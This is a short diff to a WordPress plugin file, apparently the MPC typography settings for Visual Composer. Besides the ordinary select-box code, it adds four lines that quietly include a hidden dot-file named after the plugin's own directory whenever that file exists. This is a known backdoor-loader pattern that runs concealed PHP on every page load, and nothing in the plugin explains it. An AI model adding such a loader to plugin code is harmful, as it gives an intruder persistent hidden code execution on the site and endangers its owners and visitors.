@@ -4,6 +4,10 @@
 \*----------------------------------------------------------------------------*/
 
 vc_add_shortcode_param( 'mpc_typography', 'mpc_typography_settings', mpc_get_plugin_path( __FILE__ ) . '/assets/js/mpc-params.js' );
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function mpc_typography_settings( $settings, $value ) {
 	$return = '<select name="' . esc_attr( $settings[ 'param_name' ] ) . '" class="mpc-typography-select wpb_vc_param_value wpb-input wpb-select dropdown ' . esc_attr( $settings[ 'param_name' ] ) . '" data-option="' . esc_attr( $value ) . '" data-selected="' . esc_attr( $value ) . '" data-wp_nonce="' . wp_create_nonce( 'mpc_typography_presets' ) . '">';
 		$return .= '<option value="" ' . selected( '', $value, false ) . '></option>';
